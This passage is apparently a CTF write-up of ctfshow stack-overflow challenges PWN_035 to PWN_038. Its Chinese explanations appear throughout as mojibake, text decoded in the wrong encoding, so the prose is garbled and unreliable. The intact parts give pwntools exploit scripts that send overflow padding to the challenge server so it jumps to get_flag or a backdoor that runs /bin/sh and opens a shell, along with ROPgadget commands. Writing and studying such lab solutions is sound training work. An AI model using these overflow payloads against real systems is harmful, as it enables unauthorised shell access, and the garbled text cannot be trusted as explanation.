ä½¿ç”¨ida64åç¼–è¯‘çš„åŠ è¿‡ç•¥å¾®ä¸å‰ä¸¤é“é¢˜ç›®æœ‰æ‰€ä¸åŒï¼Œå¤§éƒ¨åˆ†è¿˜æ˜¯ä¸€æ ·çš„ï¼Œè¿˜æ˜¯æŠŠå±é™©å‡½æ•°æ›¿æ¢æˆäº†å®‰å…¨å‡½æ•°ã€‚å¦‚ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/94.png"
	width="814"
	height="505"
	srcset="/p/ctfshow-pwn-writeup/94_hu_43f6bccc3a9f8aca.png 480w, /p/ctfshow-pwn-writeup/94_hu_7ea7c32cd0d7cfe1.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="161"
		data-flex-basis="386px"
	
></p>
<p>å¤§è‡´èƒ½çœ‹å‡ºåŸå‡½æ•°æ˜¯ä»€ä¹ˆå§ï¼Œè¿™é‡Œå°±ä¸å¤šè§£é‡Šäº†&hellip;</p>
<p># æ ¼å¼åŒ–å‡½æ•°ä¸è§£é¢˜æ“ä½œè¯´æ˜ <code>__printf__chk</code> å‡½æ•°ä¸ <code>printf</code> çš„åŒºåˆ«åœ¨äºï¼šä¸èƒ½ä½¿ç”¨ <code>%x$n</code> ä¸è¿ç»­åœ°æ‰“å°ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¦ä½¿ç”¨ <code>%3$n</code>ï¼Œåˆ™å¿…é¡»åŒæ—¶ä½¿ç”¨ <code>%1$n</code> å’Œ <code>%2$n</code>ã€‚åœ¨ä½¿ç”¨ <code>%n</code> çš„æ—¶å€™ä¼šåšä¸€äº›æ£€æŸ¥ã€‚ è¿™æ¶‰åŠåˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æœ¬é¢˜ä¸æ¶‰åŠæ­¤æ¼æ´ï¼Œæ‰€ä»¥å¯¹æœ¬é“é¢˜å‡ ä¹æ²¡æœ‰é˜»ç¢ã€‚åç»­æˆ‘ä»¬è¿˜æ˜¯é€šè¿‡ SSH è¿æ¥åè¿è¡Œæ–‡ä»¶ï¼Œè¾“å…¥ 4 ä¸ªé•¿åº¦ä¸º 1 çš„å‚æ•°ï¼Œä¸å‡ºæ„å¤–å°±èƒ½æ‹¿åˆ° flagï¼</p>
<p><img src="/p/ctfshow-pwn-writeup/95.png"
	width="1493"
	height="726"
	srcset="/p/ctfshow-pwn-writeup/95_hu_b3792e7f70688569.png 480w, /p/ctfshow-pwn-writeup/95_hu_abc131af3d5d11c9.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="205"
		data-flex-basis="493px"
	
></p>
<h2 id="æ ˆæº¢å‡º">æ ˆæº¢å‡º
</h2><h3 id="pwn_035">PWN_035
</h3><p>é¢˜ç›®ï¼šæ­£å¼å¼€å§‹æ ˆæº¢å‡ºäº†ï¼Œå…ˆæ¥ä¸€ä¸ªæœ€æœ€æœ€æœ€ç®€å•çš„å§</p>
<p>ç”¨æˆ·åä¸º ctfshow å¯†ç  ä¸º 123456 è¯·ä½¿ç”¨ sshè½¯ä»¶è¿æ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh ctfshow@é¢˜ç›®åœ°å€ -pé¢˜ç›®ç«¯å£å·
</span></span></code></pre></td></tr></table>
</div>
</div><p>**ä¸æ˜¯ncè¿æ¥ **</p>
<p><a class="link" href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ"  target="_blank" rel="noopener"
    >ä¸“ç”¨è™šæ‹Ÿæœºé•œåƒï¼Œå…¨å¥—åœ¨è¿™é‡Œï¼Œæå–ç show</a></p>
<p><a class="link" href="PWN_035" >PWN_035</a></p>
<hr>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/96.png"
	width="845"
	height="198"
	srcset="/p/ctfshow-pwn-writeup/96_hu_5cec7781a9fafd95.png 480w, /p/ctfshow-pwn-writeup/96_hu_ceae71005b53e245.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="426"
		data-flex-basis="1024px"
	
></p>
<p>æ²¡å¼€canaryä¿æŠ¤ï¼Œå¯¹åº”äº†æœ¬ç« ä¸»é¢˜â€”â€”æ ˆæº¢å‡ºã€‚</p>
<p>IDAåˆ†æï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/97.png"
	width="1106"
	height="726"
	srcset="/p/ctfshow-pwn-writeup/97_hu_8cfcbbb1f6ccb348.png 480w, /p/ctfshow-pwn-writeup/97_hu_894ff25413a0ac82.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°åç¼–è¯‘åˆ†æ"
	
	
		class="gallery-image" 
		data-flex-grow="152"
		data-flex-basis="365px"
	
></p>
<p>è·Ÿè¿›å‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/98.png"
	width="569"
	height="200"
	srcset="/p/ctfshow-pwn-writeup/98_hu_7f17590d89865cd7.png 480w, /p/ctfshow-pwn-writeup/98_hu_492c2c611443a23c.png 1024w"
	loading="lazy"
	
		alt="sigsegv_handlerå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="284"
		data-flex-basis="682px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/99.png"
	width="564"
	height="190"
	srcset="/p/ctfshow-pwn-writeup/99_hu_64242a0110d6f688.png 480w, /p/ctfshow-pwn-writeup/99_hu_f5443b1ee09bc173.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="296"
		data-flex-basis="712px"
	
></p>
<p>ç”±æ­¤å¯çŸ¥ï¼šctfshowå‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œè¶…è¿‡104å­—èŠ‚å°±ä¼šå‘ç”Ÿæ ˆæº¢å‡ºï¼›</p>
<p>å¯¹äº<code>SIGSEGV</code>å‡½æ•°ï¼Œå½“æ ˆæº¢å‡ºè§¦å‘ SIGSEGV æ—¶ï¼Œsigsegv_handler å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œç„¶åè§¦å‘å‡½æ•°å†…éƒ¨â€”â€”fprintfæ‰“å°å‡ºflagå­—ç¬¦ä¸²ï¼Œä¹Ÿæ­£å¥½å¯¹åº”äº†fgetå‡½æ•°è¯»å–çš„flagå€¼ã€‚</p>
<blockquote class="alert alert-warn">
    <p>æ ˆæº¢å‡ºä¼šç ´åæ ˆä¸Šçš„ â€œè¿”å›åœ°å€â€â€œæ ˆå¸§ä¿¡æ¯â€ æˆ–å…¶ä»–å…³é”®å†…å­˜ç»“æ„ï¼Œæœ€ç»ˆå¼•å‘<strong>éæ³•å†…å­˜è®¿é—®</strong>ï¼ˆæ¯”å¦‚å‡½æ•°è¿”å›æ—¶è·³è½¬åˆ°æ— æ•ˆåœ°å€ï¼‰ï¼Œè§¦å‘ <code>SIGSEGV</code> ä¿¡å·ã€‚</p></blockquote>
<p>æ‰€ä»¥è¯´æˆ‘ä»¬åªè¦åœ¨è¿è¡Œçš„æ—¶å€™ç»™ç¨‹åºæ‰“å…¥è¶…è¿‡104ä¸ªçš„å­—ç¬¦ä¸²å°±å¥½ï¼Œå¯ä»¥æ˜¯105ä¸ªâ€œaâ€ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/100.png"
	width="1235"
	height="555"
	srcset="/p/ctfshow-pwn-writeup/100_hu_3fabc6f5bf3328d1.png 480w, /p/ctfshow-pwn-writeup/100_hu_28f40016a971c608.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="534px"
	
></p>
<h3 id="binshåœ°å€çš„è·³è½¬åˆ©ç”¨"><strong>/bin/shåœ°å€çš„è·³è½¬åˆ©ç”¨</strong>
</h3><p>ç›¸è¾ƒäº32ä½ç¨‹åºï¼Œ64 ä½ç¨‹åºè°ƒç”¨å‡½æ•°éœ€æ»¡è¶³ <strong>æ ˆå¯¹é½</strong>ï¼Œå› æ­¤æ„é€  payload æ—¶éœ€æ³¨æ„ï¼š</p>
<p>åœ¨å®é™…è§£é¢˜ä¸­ï¼Œ<code>ret</code> åœ°å€éœ€è¦é’ˆå¯¹å½“å‰é¢˜ç›®åŠ¨æ€è·å–ï¼Œç”¨ <code>ROPgadget</code> å·¥å…·ç›´æ¥æœç´¢ç¨‹åºä¸­çš„ <code>ret</code> æŒ‡ä»¤ï¼ˆæœ€å¸¸ç”¨ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_036">PWN_036
</h3><p>é¢˜ç›®ï¼šå­˜åœ¨åé—¨å‡½æ•°ï¼Œå¦‚ä½•åˆ©ç”¨ï¼Ÿ <a class="link" href="PWN_036" >PWN_036</a></p>
<p><img src="/p/ctfshow-pwn-writeup/101.png"
	width="826"
	height="231"
	srcset="/p/ctfshow-pwn-writeup/101_hu_6afe63e25fe4af19.png 480w, /p/ctfshow-pwn-writeup/101_hu_ca0bed959ef72a10.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="357"
		data-flex-basis="858px"
	
></p>
<p>éå¸¸ä¸å®‰å…¨ï¼ï¼ï¼ï¼æ²¡æœ‰canaryä¿æŠ¤ã€‚å¯ä»¥ç”¨ret2shellcodeã€ret2libcã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/102.png"
	width="1225"
	height="506"
	srcset="/p/ctfshow-pwn-writeup/102_hu_1ea758b340b9373a.png 480w, /p/ctfshow-pwn-writeup/102_hu_c4eefe935b6b6cf7.png 1024w"
	loading="lazy"
	
		alt="main-IDAçš„åˆ†æ"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="581px"
	
></p>
<p>è¿™é¢˜å¼€å§‹æ€ªæ€ªçš„ï¼Œæ‰¾ä¸åˆ°/bin/shçš„åé—¨ï¼Œsigsegv_handler å‡½æ•°æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„flagï¼Œä¸è¿‡åœ¨å·¦è¾¹å‡½æ•°ç›®å½•çœ‹åˆ°ç†Ÿæ‚‰çš„æ•…äººâ€”â€”get_flagå‡½æ•°ï¼Œç›´æ¥è·Ÿè¿›çœ‹çœ‹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/103.png"
	width="961"
	height="289"
	srcset="/p/ctfshow-pwn-writeup/103_hu_ec17c27209d749fe.png 480w, /p/ctfshow-pwn-writeup/103_hu_ed5b527b98ddfd0f.png 1024w"
	loading="lazy"
	
		alt="è·Ÿè¿›get_flagå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="332"
		data-flex-basis="798px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„fgetsè¯»å–å’Œè¿”å›çš„printf(s)æ‰“å°å‡½æ•°ï¼Œè¾“å‡ºflagå­—ç¬¦ä¸²ï¼Œä¸»å‡½æ•°æ²¡æœ‰å¼•ç”¨å®ƒå•Šï¼Œæ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬åªéœ€è¦åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´è¦†ç›–è¿”å›åœ°å€ï¼Œå°†ç¨‹åºçš„æ‰§è¡Œæµç¨‹è½¬å‘ get_flag å‡½æ•°ï¼Œä»è€Œè·å–flagã€‚ï¼ˆå¯ä»¥ç”¨ret2shellcodeã€ret2libcï¼‰</p>
<p>mainå‡½æ•°çš„çªç ´ç‚¹åœ¨è¿™ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/104.png"
	width="860"
	height="215"
	srcset="/p/ctfshow-pwn-writeup/104_hu_5cc36469a1fe2e12.png 480w, /p/ctfshow-pwn-writeup/104_hu_fcf805775837a51c.png 1024w"
	loading="lazy"
	
		alt="åœ¨mainè·Ÿè¿›ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="400"
		data-flex-basis="960px"
	
></p>
<p>æ²¡å¼€canaryä¿æŠ¤ï¼Œsæ•°ç»„å¯å­˜å‚¨å¤§å°èŒƒå›´æ˜¯36ï¼Œè¶…è¿‡äº†å°±è¦†ç›–è¿”å›åœ°å€äº†ã€‚</p>
<blockquote class="alert alert-error">
    <blockquote>
<p>gets è¯»å–å‡½æ•°æ˜¯éå¸¸ä¸å®‰å…¨çš„ï¼Œå®¹æ˜“å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚å› ä¸ºå®ƒæ— æ³•é™åˆ¶è¾“å…¥çš„é•¿åº¦ï¼Œå¯èƒ½ä¼šè¶…å‡ºs æ•°ç»„çš„å®¹é‡ï¼Œå¯¼è‡´è¦†ç›–æ ˆä¸Šçš„å…¶ä»–æ•°æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¿™ä¹Ÿæ˜¯æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œsè·ebpä»…æœ‰0x28ï¼Œè€Œgetsä¸é™åˆ¶è¾“å…¥é•¿åº¦ã€‚</p>
<p>å®‰å…¨æ€§æ¥çœ‹ä¸€èˆ¬éƒ½ä¼šç”¨fgetså‡½æ•°ï¼Œæ­é…<strong>FORTIFY ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥</strong>æ¥æé«˜ç¨‹åºè‡ªèº«å®‰å…¨æ€§ã€‚</p></blockquote></blockquote>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28297</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">get_flag_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;get_flag&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">44</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_flag_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1">#è¿œç¨‹å‘é€</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>     <span class="c1">#å¼€å¯shelläº¤äº’æ¨¡å¼ï¼ˆç±»ä¼¼ç»ˆç«¯ï¼‰</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„44ä¸ªâ€˜aâ€™æ˜¯0x28 + 4 ï¼Œ0x28ï¼ˆåè¿›åˆ¶ 40ï¼‰æ˜¯ç¼“å†²åŒºåˆ° ebpï¼ˆæ ˆåŸºå€å¯„å­˜å™¨ï¼‰çš„è·ç¦»ï¼Œ+4 æ˜¯è¦†ç›– ebp æœ¬èº«ï¼ˆ32 ä½ç¨‹åºä¸­å¯„å­˜å™¨å  4 å­—èŠ‚ï¼‰ï¼Œæ€»å…± 44 å­—èŠ‚åï¼Œåç»­æ•°æ®æ‰èƒ½è¦†ç›–å‡½æ•°çš„ â€œè¿”å›åœ°å€â€ï¼Œä»è€Œè·³è½¬åˆ° get_flag å‡½æ•°ã€‚å½“ç„¶ä½ å¯ä»¥ç”¨cyclic(0x28 + 4)ï¼Œäº§ç”Ÿ44å­—èŠ‚çš„åƒåœ¾å€¼ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/105.png"
	width="1130"
	height="569"
	srcset="/p/ctfshow-pwn-writeup/105_hu_9fe21db2e56fb303.png 480w, /p/ctfshow-pwn-writeup/105_hu_2f03f58823b9acb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="476px"
	
></p>
<h3 id="pwn_037">PWN_037
</h3><p>é¢˜ç›®ï¼š32ä½çš„ system(â€œ/bin/shâ€) åé—¨å‡½æ•°ç»™ä½ ã€‚ <a class="link" href="PWN_037" >PWN_037</a></p>
<p>checksecå‘ç°æ˜¯æœ‰æ— æ ˆæº¢å‡ºä¿æŠ¤çš„ï¼Œå…³äº†canaryã€‚</p>
<p>IDAåˆ†æï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/106.png"
	width="649"
	height="204"
	srcset="/p/ctfshow-pwn-writeup/106_hu_28baf5c7d68b2e77.png 480w, /p/ctfshow-pwn-writeup/106_hu_1e83db09825e803f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="318"
		data-flex-basis="763px"
	
></p>
<p>å¯ä»¥å‘ç°mainå‡½æ•°æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯åœ¨å‡½æ•°ç›®å½•å¯ä»¥çœ‹åˆ°æœ‰ä¸ªbackdoorçš„å‡½æ•°æœ‰çŒ«è…»&hellip;.</p>
<p><img src="/p/ctfshow-pwn-writeup/107.png"
	width="689"
	height="309"
	srcset="/p/ctfshow-pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, /p/ctfshow-pwn-writeup/107_hu_82558c987e30e4e0.png 1024w"
	loading="lazy"
	
		alt="çœŸâ€œåé—¨â€å‡½æ•°â€”â€”backdoor"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="535px"
	
></p>
<p>è¿™ä¸ªå‡½æ•°å±…ç„¶æœ‰/bin/shï¼ï¼ï¼ï¼ï¼</p>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/108.png"
	width="685"
	height="149"
	srcset="/p/ctfshow-pwn-writeup/108_hu_2f6decafcbb4d7a.png 480w, /p/ctfshow-pwn-writeup/108_hu_13e7ed272ddf4f58.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="459"
		data-flex-basis="1103px"
	
></p>
<p>æœ‰readè¯»å–å‡½æ•°ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä»¥æ­¤ä¸ºæ³¨å…¥ç‚¹ï¼Œç”¨åƒåœ¾å€¼0x12+4å…ˆè¦†ç›–å‡½æ•°å˜é‡å’Œå¯„å­˜å™¨ebpæœ¬èº«ï¼Œç„¶åå†ä¸Šä¼ ä¸€ä¸ªåé—¨å‡½æ•°çš„åœ°å€ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28229</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]</span> <span class="c1">#åé—¨å‡½æ•°çš„åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/109.png"
	width="1043"
	height="460"
	srcset="/p/ctfshow-pwn-writeup/109_hu_5594301dde95ce57.png 480w, /p/ctfshow-pwn-writeup/109_hu_f2393a4d4b100c98.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="226"
		data-flex-basis="544px"
	
></p>
<p>è„šæœ¬expä¸‡å²ã€‚</p>
<h3 id="pwn_038">PWN_038
</h3><p>é¢˜ç›®ï¼š64ä½çš„ system(â€œ/bin/shâ€) åé—¨å‡½æ•°ç»™ä½ ã€‚</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/110.png"
	width="845"
	height="209"
	srcset="/p/ctfshow-pwn-writeup/110_hu_cc699b9c9e84b874.png 480w, /p/ctfshow-pwn-writeup/110_hu_818237d793c59893.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="404"
		data-flex-basis="970px"
	
></p>
<p>æ²¡å¼€canaryä¿æŠ¤ï¼Œå¼€NXä¿æŠ¤ï¼ˆä¸èƒ½ret2shellcodeï¼‰</p>
<p><img src="/p/ctfshow-pwn-writeup/111.png"
	width="653"
	height="150"
	srcset="/p/ctfshow-pwn-writeup/111_hu_557177fc9847835c.png 480w, /p/ctfshow-pwn-writeup/111_hu_3e2e3f6328afcdc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="435"
		data-flex-basis="1044px"
	
></p>
<p>bufæ•°ç»„è·ç¦»ebpå¯„å­˜å™¨ä¸º0xAhï¼ŒåŠ ä¸Šæœ¬èº«å¯„å­˜å™¨ebpçš„8å­—èŠ‚ã€‚</p>
<p>è·Ÿè¿›backdoorå‡½æ•°çœ‹åˆ°/bin/shï¼Œæœ¬é¢˜æ€è·¯å’Œä¸Šé¢˜PWN_037ä¸€æ ·ï¼Œåªä¸è¿‡æ¶æ„å˜æˆ64ä½è€Œå·²ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/107.png"
	width="689"
	height="309"
	srcset="/p/ctfshow-pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, /p/ctfshow-pwn-writeup/107_hu_82558c987e30e4e0.png 1024w"
	loading="lazy"
	
		alt="ä¸Šé¢˜backdoorå‡½æ•°çš„intç±»å‹"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="535px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/112.png"
	width="610"
	height="126"
	srcset="/p/ctfshow-pwn-writeup/112_hu_7a50666a6534a184.png 480w, /p/ctfshow-pwn-writeup/112_hu_f2c44b968d3f43b7.png 1024w"
	loading="lazy"
	
		alt="æœ¬é¢˜çš„åé—¨å‡½æ•°int_64"
	
	
		class="gallery-image" 
		data-flex-grow="484"
		data-flex-basis="1161px"
	
></p>
<blockquote class="alert alert-note">
    <blockquote>
<p>64 ä½ç¨‹åºè°ƒç”¨ <code>system</code> éœ€è€ƒè™‘å †æ ˆå¹³è¡¡ï¼Œæœ¬è´¨æ˜¯ <strong>64 ä½ ABI å¯¹ â€œæ ˆå¯¹é½â€ çš„ç¡¬æ€§è¦æ±‚</strong>â€”â€” è‹¥ä¸æ»¡è¶³ï¼Œå‡½æ•°æ‰§è¡Œæ—¶è®¿é—®æ ˆå†…å­˜ä¼šå´©æºƒï¼›è€Œ 32 ä½ ABI æ— æ­¤è¦æ±‚ï¼Œä»…éœ€è°ƒç”¨åæ¸…ç†å‚æ•°æ ˆå³å¯ï¼Œå› æ­¤æ— éœ€é¢å¤–å…³æ³¨å¹³è¡¡ã€‚</p></blockquote></blockquote>
<p>æ‰€ä»¥è¯´expéœ€è¦è€ƒè™‘åˆ°å †æ ˆå¹³è¡¡åŠ ä¸Šretè¿”å›åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/113.png"
	width="1198"
	height="261"
	srcset="/p/ctfshow-pwn-writeup/113_hu_3770565c136ecdbb.png 480w, /p/ctfshow-pwn-writeup/113_hu_f3c84935d209b6bf.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="459"
		data-flex-basis="1101px"
	
></p>
<p>åœ¨å®é™…è§£é¢˜ä¸­ï¼Œ<code>ret</code> åœ°å€éœ€è¦é’ˆå¯¹å½“å‰é¢˜ç›®åŠ¨æ€è·å–ï¼Œå¸¸ç”¨æ–¹æ³•ï¼š</p>
<p><strong>å·¥å…·æŸ¥æ‰¾</strong>ï¼šç”¨ <code>ROPgadget</code> å·¥å…·ç›´æ¥æœç´¢ç¨‹åºä¸­çš„ <code>ret</code> æŒ‡ä»¤ï¼ˆæœ€å¸¸ç”¨ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
</span></span></code></pre></td></tr></table>
</div>
</div><p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28147</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x400287</span> <span class="c1"># 0x0000000000400287 : ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
